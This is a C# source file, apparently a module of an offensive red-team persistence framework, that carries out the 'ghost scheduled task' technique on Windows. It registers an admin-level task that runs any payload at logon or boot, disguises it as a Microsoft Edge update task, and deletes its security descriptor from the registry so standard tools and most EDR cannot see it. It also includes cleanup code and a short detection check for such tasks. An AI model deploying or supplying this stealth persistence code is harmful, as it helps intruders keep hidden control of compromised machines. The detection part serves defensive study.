using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Ghost Scheduled Task (T1053.005)
    ///
    /// Creates a scheduled task via COM ITaskService, then deletes the Security
    /// Descriptor (SD) value from the TaskCache\Tree registry key. Without an SD,
    /// the task is invisible to schtasks.exe, Task Scheduler GUI, and most EDR
    /// scheduled-task enumeration - but the Task Scheduler service still executes it.
    ///
    /// Technique documented in Microsoft's Tarrask analysis (2022), adopted by
    /// multiple ransomware groups (Dark Angels, Akira) and APT28 in 2025-2026.
    /// Requires admin (HKLM TaskCache write).
    /// </summary>
    public class GhostTask : ITendril
    {
        public string Name { get { return "GhostTask"; } }
        public string Description { get { return "Hidden scheduled task - invisible to schtasks and Task Scheduler GUI"; } }
        public string MitreId { get { return "T1053.005"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string TaskCacheTree = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree";
        private const string TaskCacheTasks = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string taskName, payload, arguments;
            if (!options.TryGetValue("name", out taskName))
                taskName = "MicrosoftEdgeUpdateCore";

            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<executable_path>");

            if (!options.TryGetValue("arguments", out arguments))
                arguments = "";

            try
            {
                // Step 1: Create task via COM (ITaskService) - this generates proper
                // binary blobs in the registry that the scheduler understands.
                Type taskServiceType = Type.GetTypeFromProgID("Schedule.Service");
                if (taskServiceType == null)
                    return new TendrilResult(ResultStatus.Failed, Name, "Schedule.Service COM class not found");

                dynamic scheduler = Activator.CreateInstance(taskServiceType);
                scheduler.Connect();

                dynamic taskDef = scheduler.NewTask(0);

                // Registration info - blend in
                taskDef.RegistrationInfo.Description = "Microsoft Edge component update task";
                taskDef.RegistrationInfo.Author = "Microsoft Corporation";

                // Trigger: logon trigger (fires at any user logon)
                string triggerType;
                if (!options.TryGetValue("trigger", out triggerType))
                    triggerType = "logon";

                if (triggerType == "boot")
                {
                    // TASK_TRIGGER_BOOT = 8
                    dynamic trigger = taskDef.Triggers.Create(8);
                    trigger.Delay = "PT1M";
                }
                else
                {
                    // TASK_TRIGGER_LOGON = 9
                    dynamic trigger = taskDef.Triggers.Create(9);
                    trigger.Delay = "PT30S";
                }

                // Settings - run whether user is logged on or not
                taskDef.Settings.Enabled = true;
                taskDef.Settings.Hidden = true;
                taskDef.Settings.DisallowStartIfOnBatteries = false;
                taskDef.Settings.StopIfGoingOnBatteries = false;

                // Action
                dynamic action = taskDef.Actions.Create(0); // TASK_ACTION_EXEC
                action.Path = payload;
                if (!string.IsNullOrEmpty(arguments))
                    action.Arguments = arguments;

                // Register the task
                // TASK_CREATE_OR_UPDATE = 6, TASK_LOGON_INTERACTIVE_TOKEN = 3
                dynamic folder = scheduler.GetFolder(@"\");
                folder.RegisterTaskDefinition(
                    taskName, taskDef, 6, null, null, 3, null);

                // Step 2: Delete the SD value to make the task invisible
                // This is the Tarrask technique - without an SD, enumeration APIs skip it
                string treePath = TaskCacheTree + @"\" + taskName;
                bool sdDeleted = RegistryUtils.DeleteRegValue("HKLM", treePath, "SD");

                string visibility = sdDeleted ? "GHOST (SD removed)" : "VISIBLE (SD removal failed)";

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("Scheduled task created: {0} [{1}]", taskName, visibility))
                    .WithMeta("TaskName", taskName)
                    .WithMeta("Payload", payload)
                    .WithMeta("Arguments", arguments)
                    .WithMeta("Trigger", triggerType)
                    .WithMeta("Visibility", visibility);
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Ghost task creation failed: " + ex.Message);
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string taskName;
            if (!options.TryGetValue("name", out taskName))
                taskName = "MicrosoftEdgeUpdateCore";

            try
            {
                Type taskServiceType = Type.GetTypeFromProgID("Schedule.Service");
                dynamic scheduler = Activator.CreateInstance(taskServiceType);
                scheduler.Connect();

                dynamic folder = scheduler.GetFolder(@"\");

                // If the task is ghosted (no SD), we can't delete via COM - 
                // need to restore SD first or delete registry keys directly
                try
                {
                    folder.DeleteTask(taskName, 0);
                }
                catch
                {
                    // Task may be ghosted; clean up registry directly
                    // Get the task GUID from the Tree key
                    string treePath = TaskCacheTree + @"\" + taskName;
                    string taskId = RegistryUtils.GetRegValue("HKLM", treePath, "Id");

                    if (!string.IsNullOrEmpty(taskId))
                    {
                        // Delete Tasks\{GUID}
                        RegistryUtils.DeleteRegKeyTree("HKLM", TaskCacheTasks + @"\" + taskId);
                    }
                    // Delete Tree\TaskName
                    RegistryUtils.DeleteRegKeyTree("HKLM", treePath);
                }

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("Task removed: {0}", taskName))
                    .WithMeta("TaskName", taskName);
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Task removal failed: " + ex.Message);
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            // Look for ghost tasks: TaskCache\Tree entries missing an SD value
            string[] taskNames = RegistryUtils.GetRegSubkeys("HKLM", TaskCacheTree);
            foreach (string task in taskNames)
            {
                string treePath = TaskCacheTree + @"\" + task;
                string sd = RegistryUtils.GetRegValue("HKLM", treePath, "SD");
                string taskId = RegistryUtils.GetRegValue("HKLM", treePath, "Id");

                if (sd == null && !string.IsNullOrEmpty(taskId))
                {
                    // Ghost task found - no SD means invisible to standard enumeration
                    string tasksPath = TaskCacheTasks + @"\" + taskId;
                    string path = RegistryUtils.GetRegValue("HKLM", tasksPath, "Path");

                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("GHOST TASK: {0} (missing SD value)", task))
                        .WithMeta("TaskName", task)
                        .WithMeta("TaskId", taskId)
                        .WithMeta("TaskPath", path ?? "unknown"));
                }
            }

            return results;
        }
    }
}
